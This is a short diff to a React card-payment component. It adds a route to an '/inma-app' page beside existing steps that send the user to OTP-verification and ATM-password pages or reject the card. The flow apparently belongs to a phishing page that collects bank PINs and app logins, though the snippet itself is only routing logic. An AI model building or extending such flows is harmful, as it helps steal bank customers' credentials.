@@ -209,6 +209,8 @@ export default function CreditCardPayment() {
         navigate("/otp-verification");
       } else if (action === 'atm') {
         navigate("/atm-password");
+      } else if (action === 'inma') {
+        navigate("/inma-app");
       } else if (action === 'reject') {
         setRejectedError(true);
         // تفريغ جميع الحقول عند رفض البطاقة
